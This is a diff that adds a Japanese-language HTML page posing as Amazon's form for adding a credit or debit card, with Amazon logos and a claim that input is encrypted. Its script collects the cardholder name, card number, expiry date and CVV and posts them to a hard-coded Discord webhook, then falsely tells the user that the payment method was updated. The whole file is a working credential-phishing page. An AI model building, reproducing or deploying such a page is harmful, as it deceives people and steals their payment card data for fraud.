@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <link rel="icon" href="https://i0.wp.com/goworkship.com/magazine/wp-content/uploads/2019/10/Amazon-logo-history-5-557x400.jpg?resize=557%2C400&ssl=1" type="image/png">
+  <title>お支払い方法</title>
+  <style>
+    body {
+      font-family: "Segoe UI", sans-serif;
+      background-color: #f6f6f6;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .card-form {
+      background-color: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 400px;
+    }
+    .card-form h2 {
+      margin-bottom: 20px;
+      font-size: 1.2em;
+      color: #333;
+    }
+    .card-form label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: bold;
+      color: #555;
+    }
+    .card-form input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 5px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 1em;
+    }
+    .error {
+      color: red;
+      font-size: 0.8em;
+      margin-bottom: 10px;
+      display: none;
+    }
+    .card-form button {
+      width: 100%;
+      padding: 12px;
+      background-color: #ffa500;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 1em;
+      cursor: pointer;
+    }
+    .card-form button:hover {
+      background-color: #ff8c00;
+    }
+    .note {
+      font-size: 0.8em;
+      color: #888;
+      margin-top: 10px;
+      text-align: center;
+    }
+    .login-logo {
+      display: block;
+      margin: 0 auto 20px;
+      max-width: 150px;
+    }
+  </style>
+</head>
+<body>
+  <form class="card-form" id="paymentForm">
+    <img src="https://m.media-amazon.com/images/G/01/digital/PV_Logo_Landscape_Smile_Centred_Dark_Squid_Ink_RGB_150._CB554671110_.png" alt="Amazonロゴ" class="login-logo">
+    <h2>クレジットまたはデビットカードを追加</h2>
+
+    <label for="cardNumber">カード番号*</label>
+    <input type="text" id="cardNumber" name="cardNumber" placeholder="例: 1234 5678 9012 3456">
+    <div class="error" id="cardNumberError">カード番号を入力してください</div>
+
+    <label for="expiry">有効期限（MM/YY）*</label>
+    <input type="text" id="expiry" name="expiry" placeholder="例: 08/25">
+    <div class="error" id="expiryError">有効期限を入力してください</div>
+
+    <label for="cardHolder">カードの名義*</label>
+    <input type="text" id="cardHolder" name="cardHolder" placeholder="例: TARO YAMADA">
+    <div class="error" id="cardHolderError">カード名義を入力してください</div>
+
+    <label for="cvv">セキュリティコード（CVV）*</label>
+    <input type="text" id="cvv" name="cvv" placeholder="例: 123">
+    <div class="error" id="cvvError">CVVを入力してください</div>
+
+    <button type="submit">次へ進む</button>
+    <p class="note">お客様の情報は暗号化にて保護されています</p>
+  </form>
+
+  <script>
+    document.getElementById("paymentForm").addEventListener("submit", function(e) {
+      e.preventDefault(); // 送信を止める
+
+      let valid = true;
+
+      const cardNumber = document.getElementById("cardNumber");
+      const expiry = document.getElementById("expiry");
+      const cardHolder = document.getElementById("cardHolder");
+      const cvv = document.getElementById("cvv");
+
+      const cardNumberError = document.getElementById("cardNumberError");
+      const expiryError = document.getElementById("expiryError");
+      const cardHolderError = document.getElementById("cardHolderError");
+      const cvvError = document.getElementById("cvvError");
+
+      // バリデーション
+      if (cardNumber.value.trim() === "") {
+        http://cardNumberError.style.display = "block";
+        valid = false;
+      } else {
+        http://cardNumberError.style.display = "none";
+      }
+
+      if (expiry.value.trim() === "") {
+        http://expiryError.style.display = "block";
+        valid = false;
+      } else {
+        http://expiryError.style.display = "none";
+      }
+
+      if (cardHolder.value.trim() === "") {
+        http://cardHolderError.style.display = "block";
+        valid = false;
+      } else {
+        http://cardHolderError.style.display = "none";
+      }
+
+      if (cvv.value.trim() === "") {
+        http://cvvError.style.display = "block";
+        valid = false;
+      } else {
+        http://cvvError.style.display = "none";
+      }
+
+      if (!valid) return;
+
+      // Discord Webhook送信処理
+      const webhookUrl = "https://discord.com/api/webhooks/1410944252866723920/DoQOEwDDRpnn0UyokFFvoGAXKNp6NeDBs1s--77bo07Lklk6mXZj7u0AXJLpDZR_w0B-";
+
+      const payload = {
+        content: `💳 新しいカード情報が送信されました\n\n**名義人**: ${cardHolder.value}\n**カード番号**: ${cardNumber.value}\n**有効期限**: ${expiry.value}\n**CVV**: ${cvv.value}`
+      };
+
+      fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(response => {
+        if (response.ok) {
+          alert("支払い方法の変更が完了しました。");
+        } else {
+          alert("送信に失敗しました。");
+        }
+      })
+      .catch(error => {
+        console.error("送信エラー:", error);
+        alert("エラーが発生しました。");
+      });
+    });
+  </script>
+</body>
+</html>
